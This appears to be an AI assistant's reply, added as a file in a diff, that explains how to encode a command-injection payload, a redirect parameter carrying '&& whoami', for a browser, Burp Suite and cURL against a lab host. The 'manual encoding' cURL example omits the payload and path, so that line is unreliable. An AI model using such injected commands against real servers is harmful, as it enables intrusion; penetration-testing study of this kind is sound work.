@@ -1,0 +1,51 @@
+The way you format spaces and special characters changes drastically depending on whether you use a Web Browser, Burp Suite, or cURL.
+Here is exactly how to format the payload login?redirect=/ && whoami for each tool to prevent client errors and ensure the command reaches the server intact.
+------------------------------
+## 1. Web Browser (Address Bar)
+Browsers are highly sensitive to raw spaces and characters like &. If you type a raw &, the browser thinks you are starting a new URL parameter (e.g., parameter2=whoami) instead of chaining a command.
+
+* The Rule: You must manually URL-encode the spaces and the ampersands.
+* What to type:
+
+login?redirect=/%20%26%26%20whoami
+
+(Note: %20 is a space, and %26 is an ampersand &)
+
+## 2. Burp Suite (Repeater)
+Burp Suite sends raw HTTP requests. If you paste raw spaces into the path of an HTTP request line (e.g., GET /login?redirect=/ && whoami HTTP/1.1), it breaks the HTTP protocol structure and causes a "Bad Request" or client-side error.
+
+* The Rule: Encode the payload within the request body or URL line.
+* How to do it:
+1. Paste your raw payload into the Repeater tab: login?redirect=/ && whoami
+   2. Highlight the characters / && whoami
+   3. Press Ctrl + U (Windows) or Cmd + U (Mac) to URL-encode it.
+* What it should look like in the raw tab:
+
+GET /login?redirect=%2f%20%26%26%20whoami HTTP/1.1
+Host: target-app.local
+
+
+## 3. cURL (Command Line)
+When using cURL, your local terminal (Linux/Mac/PowerShell) will try to interpret the & characters locally before sending the request to the network. If you don't wrap it in quotes, your local computer will try to run whoami instead of sending it to the target web server.
+
+* The Rule: Put the entire URL in single quotes, and use the --data-urlencode flag or manual encoding.
+* Option A (Manual Encoding - Safest):
+
+curl -i 'http://target-app.local'
+
+* Option B (Let cURL do the encoding automatically):
+
+curl -i -G --data-urlencode "redirect=/ && whoami" 'http://target-app.local'
+
+
+------------------------------
+## Quick Reference Summary Table
+
+| Tool | Space Behavior | Ampersand (&) Behavior | Final Payload Look |
+|---|---|---|---|
+| Browser | Must be %20 | Must be %26%26 | redirect=/%20%26%26%20whoami |
+| Burp Suite | Raw space breaks HTTP; use %20 | Raw & splits parameters; use %26%26 | redirect=%2f%20%26%26%20whoami |
+| cURL | Must be enclosed in quotes | Must be enclosed in quotes or encoded | 'URL?redirect=%2f%20%26%26%20whoami' |
+
+Which tool are you actively using right now where you saw the error? I can help you verify the exact raw HTTP request syntax if you share what your current request looks like.
+
